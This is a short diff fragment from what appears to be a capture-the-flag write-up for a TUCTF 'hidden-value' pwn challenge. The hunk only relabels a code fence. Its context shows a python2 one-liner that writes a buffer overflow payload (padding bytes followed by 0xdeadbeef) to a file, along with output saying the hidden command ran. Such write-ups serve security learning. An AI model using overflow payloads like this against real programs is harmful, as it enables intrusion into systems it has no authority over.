@@ -119,7 +119,7 @@ b'Enter your name: Congratulations! You have executed the hidden command.\nThe f
 ```
 
 I also made manual payload for fun
-```shell
+```shell + console
 ┌──(vein㉿vein)-[~/tuctf/pwn_hidden-value]
 └─$ python2 -c print"'a' * 44 + '\xef\xbe\xad\xde'"> payload
 
